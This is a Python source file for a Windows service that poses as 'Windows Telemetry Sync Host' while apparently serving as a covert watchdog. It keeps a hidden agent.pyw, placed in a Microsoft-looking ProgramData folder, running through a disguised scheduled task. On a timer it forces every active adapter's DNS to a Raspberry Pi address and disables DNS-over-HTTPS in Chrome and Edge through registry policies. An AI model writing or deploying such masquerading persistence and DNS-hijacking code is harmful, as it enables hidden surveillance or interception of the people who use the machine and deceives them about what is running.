"""
Windows Telemetry Sync Host
Remote diagnostics and telemetry synchronization service.
"""
import sys, json, subprocess, logging
from pathlib import Path

import win32serviceutil
import win32service
import win32event
import winreg
import psutil
import servicemanager

BASE = Path(sys.executable).parent if getattr(sys, "frozen", False) else Path(__file__).parent

with open(BASE / "config.json") as f:
    cfg = json.load(f)

RPI_IP     = cfg.get("rpi_local_ip", "")
AGENT_PATH = Path(r"C:\ProgramData\Microsoft\Windows\DiagnosticCore\agent.pyw")
PYTHONW    = Path(sys.executable).parent / "pythonw.exe"

SVC_NAME    = "WinTelemetrySyncHost"
SVC_DISPLAY = "Windows Telemetry Sync Host"
SVC_DESC    = "Manages Windows telemetry synchronization and remote diagnostic reporting."

logging.basicConfig(
    filename=str(BASE / "watchdog.log"),
    level=logging.WARNING,
    format="%(asctime)s %(levelname)s %(message)s",
)
log = logging.getLogger(__name__)


# ── Helpers ───────────────────────────────────────────────────────────────────

def agent_running() -> bool:
    for p in psutil.process_iter(["name", "cmdline"]):
        try:
            if p.info["name"].lower() == "pythonw.exe":
                if "agent.pyw" in " ".join(p.info["cmdline"] or []):
                    return True
        except Exception:
            pass
    return False


def launch_agent():
    try:
        subprocess.run(
            ["schtasks", "/run", "/tn", "Windows Diagnostic Core Service"],
            capture_output=True, timeout=10,
        )
    except Exception as e:
        log.warning("launch_agent failed: %s", e)


def fix_dns():
    """Set DNS to RPi on every active non-Loopback, non-Tailscale adapter."""
    if not RPI_IP:
        return
    try:
        subprocess.run(
            ["powershell", "-Command",
             f'Get-NetAdapter | Where-Object {{$_.Status -eq "Up" -and '
             f'$_.InterfaceAlias -notlike "*Loopback*" -and '
             f'$_.InterfaceAlias -notlike "*Tailscale*"}} | '
             f'Set-DnsClientServerAddress -ServerAddresses ("{RPI_IP}")'],
            capture_output=True, timeout=15,
        )
    except Exception as e:
        log.warning("fix_dns failed: %s", e)


def fix_doh():
    """Ensure DNS-over-HTTPS is disabled in Chrome and Edge."""
    policy_paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Google\Chrome"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Edge"),
    ]
    for hive, path in policy_paths:
        try:
            key = winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DnsOverHttpsMode", 0, winreg.REG_SZ, "off")
            winreg.CloseKey(key)
        except Exception as e:
            log.warning("fix_doh failed for %s: %s", path, e)


# ── Service ───────────────────────────────────────────────────────────────────

class WatchdogService(win32serviceutil.ServiceFramework):
    _svc_name_         = SVC_NAME
    _svc_display_name_ = SVC_DISPLAY
    _svc_description_  = SVC_DESC

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        self.running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, ""),
        )
        tick = 0
        while self.running:
            if not agent_running():
                launch_agent()

            # Every ~60s: enforce DNS and DoH policy
            if tick % 6 == 0:
                fix_dns()
                fix_doh()

            tick += 1
            win32event.WaitForSingleObject(self.stop_event, 10000)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(WatchdogService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(WatchdogService)
